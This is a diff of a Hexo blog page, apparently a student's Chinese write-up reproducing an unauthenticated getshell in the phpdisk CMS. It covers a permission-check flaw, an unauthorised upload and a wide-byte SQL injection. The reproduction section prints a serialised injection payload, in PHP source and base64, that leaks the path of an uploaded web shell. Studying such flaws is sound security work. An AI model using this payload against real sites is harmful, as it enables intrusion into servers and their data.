@@ -1,5 +1,68 @@
-<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>xxxdisk前台Getshell[复现]</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>The clown is laughing at you</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>xxxdisk前台Getshell[复现]</h1><h2 class="headline">Jul 11, 2019 5:47·1.5k words
-·7 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-准备"><span class="toc-text">0x01 准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞成因"><span class="toc-text">0x02 漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-文件上传漏洞"><span class="toc-text">0x03 文件上传漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-权限绕过"><span class="toc-text">0x04 权限绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-未授权上传"><span class="toc-text">0x05 未授权上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-宽字节注入"><span class="toc-text">0x06 宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-漏洞复现"><span class="toc-text">0x07  漏洞复现</span></a></li></ol></div><section id="post-body"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着同学复现了一波,前台Getshell<br>参考链接:<br><a href="https://od0d.cn/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">phpdisk前台Getshell(复现)</a><br><a href="https://xz.aliyun.com/t/5594#toc-1" target="_blank" rel="noopener">代码审计 xxxdisk前台Getshell</a></p>
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>xxxdisk前台Getshell[复现] | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>xxxdisk前台Getshell[复现]</h1>
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/07/11</time>
+            
+            
+          </div>
+          <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着同学复现了一波,前台Getshell<br>参考链接:<br><a href="https://od0d.cn/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">phpdisk前台Getshell(复现)</a><br><a href="https://xz.aliyun.com/t/5594#toc-1" target="_blank" rel="noopener">代码审计 xxxdisk前台Getshell</a></p>
 <h1 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h1><p>选择的cms是phpdisk，在Windows平台的GBK版本上，挖掘到了一个无需登录的前台Getshell。</p>
 <p>同学告诉我，在审计初，最好要看看该cms的路由和全局变量过滤情况<br>然后查看之后确实是存在文件dosafe.php，将所有sql注入的参数过滤了个遍。</p>
 <h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>(1)从mydisk.php为权限判断未exit导致可以越权访问mydisk.php</p>
@@ -25,4 +88,165 @@
 <h1 id="0x07-漏洞复现"><a href="#0x07-漏洞复现" class="headerlink" title="0x07  漏洞复现"></a>0x07  漏洞复现</h1><p>(1)无权限下上传shell(刚才已上传过shell.php)<br>(2)上传成功后通过sql注入获取shell文件的位置。<br>需要获取文件位置，那么我们需要一个可以回显文件位置的地方，这里存在回显的地方，我们在页面上看，也就标签处可以回显，也就是file_description，故而构造payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"file_id"</span>=&gt;<span class="string">"17007"</span>,<span class="string">"file_name"</span>=&gt;<span class="string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2464617461)x)#"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMTAwMCI7czo5OiJmaWxlX25hbWUiO3M6MTYyOiK5/icsYGluX3NoYXJlYD0xLGBmaWxlX2Rlc2NyaXB0aW9uYD0oc2VsZWN0IHguYSBmcm9tIChzZWxlY3QgY29uY2F0KGZpbGVfc3RvcmVfcGF0aCxmaWxlX3JlYWxfbmFtZSlhIGZyb20gcGRfZmlsZXMgd2hlcmUgZmlsZV9leHRlbnNpb249MHg3MDY4NzAzYTNhMjQ2NDYxNzQ2MSl4KSMiO30=</span><br></pre></td></tr></table></figure></p>
 <p>不知道为什么这台电脑的数据库死活传不入数据库，但是复现的过程就是这样，可以参考参考链接的文章。</p>
-</section><nav id="post-nav"><span class="prev"><a href="/2019/07/12/Discuz-ML-V3-X-代码注入分析/"><span class="arrow">←</span>Newer Posts</a></span><span class="next"><a href="/2019/07/08/依葫芦画瓢之escapeshellarg-与escapeshellcmd/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-准备"><span class="toc-number">2.</span> <span class="toc-text">0x01 准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞成因"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-文件上传漏洞"><span class="toc-number">4.</span> <span class="toc-text">0x03 文件上传漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-权限绕过"><span class="toc-number">5.</span> <span class="toc-text">0x04 权限绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-未授权上传"><span class="toc-number">6.</span> <span class="toc-text">0x05 未授权上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-宽字节注入"><span class="toc-number">7.</span> <span class="toc-text">0x06 宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-漏洞复现"><span class="toc-number">8.</span> <span class="toc-text">0x07  漏洞复现</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/07/11/xxxdisk前台Getshell-复现/";
+  var disqus_url = "http://yoursite.com/2019/07/11/xxxdisk前台Getshell-复现/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-xuexiaoban"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
